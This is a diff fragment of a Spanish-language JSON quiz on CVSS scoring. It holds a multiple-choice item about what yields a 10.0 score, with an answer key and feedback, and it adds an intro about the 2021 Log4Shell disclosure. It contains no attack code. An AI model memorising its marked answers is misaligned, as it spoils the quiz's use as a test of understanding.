-          "feedback": "Incorrecto. CVSS NO considera si es zero-day o conocida. Solo evalúa características técnicas de explotabilidad e impacto. Una vulnerabilidad de 10 años puede tener 10.0 si las métricas lo justifican."
-        },
-        {
-          "id": "b",
-          "text": "Attack Vector = Network, Privileges Required = None, User Interaction = None, e Impacto CIA = High/High/High",
-          "is_correct": true,
-          "feedback": "¡CORRECTO! Para 10.0 se requiere: explotación remota sin autenticación (AV:N, PR:N), sin interacción de usuario (UI:N), complejidad baja (AC:L), e impacto total en CIA (C:H/I:H/A:H). Log4Shell cumplió TODO esto. Es el peor escenario posible."
-        },
-        {
-          "id": "c",
-          "text": "Debe afectar a millones de sistemas globalmente",
-          "is_correct": false,
-          "feedback": "Incorrecto. CVSS NO considera cuántos sistemas están afectados. Solo evalúa la vulnerabilidad en sí. Una vuln en software usado por 1 persona puede tener 10.0 si técnicamente es devastadora. El alcance es factor aparte."
-        },
-        {
-          "id": "d",
-          "text": "Debe haber causado daños financieros masivos",
-          "is_correct": false,
-          "feedback": "Incorrecto. CVSS es scoring TÉCNICO, no económico. No considera dinero perdido, reputación, o impacto de negocio. Esos son factores para risk assessment, no CVSS. Una vuln nunca explotada puede tener 10.0."
-        }
-      ]
-    }
+  ],
+  "success": true,
+  "content": {
+    "intro": "9 de diciembre, 2021. Una vulnerabilidad en Log4j, una librería de logging usada por millones de aplicaciones Java, es revelada públicamente. CVSS 10.0. Explotación trivial. Caos global."
   }
-]
+}
